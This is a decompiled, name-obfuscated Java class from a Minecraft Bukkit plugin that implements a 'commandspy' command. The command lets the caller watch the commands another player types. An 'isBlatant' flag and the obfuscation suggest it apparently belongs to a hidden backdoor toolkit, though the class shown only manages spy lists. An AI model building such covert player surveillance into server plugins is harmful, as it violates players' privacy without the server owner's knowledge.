/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class CommandspyCommand
extends Command {
    @Override
    public void execute(Core llllllllllllllIIlIIlllllIIllIlII, String llllllllllllllIIlIIlllllIIllIIll, String[] llllllllllllllIIlIIlllllIIllIIlI, Player llllllllllllllIIlIIlllllIIllIIIl) {
        if (llllllllllllllIIlIIlllllIIllIIlI.length <= 1) {
            if (llllllllllllllIIlIIlllllIIllIlII.commandSpyTargets.contains(llllllllllllllIIlIIlllllIIllIIIl.getName())) {
                llllllllllllllIIlIIlllllIIllIlII.commandSpyTargets.remove(llllllllllllllIIlIIlllllIIllIIIl.getName());
                llllllllllllllIIlIIlllllIIllIIIl.sendMessage(Settings.PREFIX("Command spy is now off!"));
            } else {
                llllllllllllllIIlIIlllllIIllIlII.commandSpyTargets.add(llllllllllllllIIlIIlllllIIllIIIl.getName());
                llllllllllllllIIlIIlllllIIllIIIl.sendMessage(Settings.PREFIX("Command spy is now on!"));
            }
        } else {
            Player llllllllllllllIIlIIlllllIIllIllI = Bukkit.getServer().getPlayer(llllllllllllllIIlIIlllllIIllIIlI[1]);
            if (llllllllllllllIIlIIlllllIIllIllI == null) {
                llllllllllllllIIlIIlllllIIllIIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIIlIIlllllIIllIIlI[1]).append(Settings.WHITE).append(" is not online."))));
            } else if (llllllllllllllIIlIIlllllIIllIlII.commandSpyMap.containsKey((Object)llllllllllllllIIlIIlllllIIllIIIl)) {
                llllllllllllllIIlIIlllllIIllIlII.commandSpyMap.remove((Object)llllllllllllllIIlIIlllllIIllIIIl);
                llllllllllllllIIlIIlllllIIllIIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You are no longer spying on ").append(Settings.RED).append(llllllllllllllIIlIIlllllIIllIllI.getName()).append("'s ").append(Settings.WHITE).append("commands"))));
            } else {
                llllllllllllllIIlIIlllllIIllIlII.commandSpyMap.put(llllllllllllllIIlIIlllllIIllIIIl, llllllllllllllIIlIIlllllIIllIllI);
                llllllllllllllIIlIIlllllIIllIIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You are now spying on ").append(Settings.RED).append(llllllllllllllIIlIIlllllIIllIllI.getName()).append("'s ").append(Settings.WHITE).append("commands"))));
            }
        }
    }

    public CommandspyCommand() {
        CommandspyCommand llllllllllllllIIlIIlllllIIllllII;
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

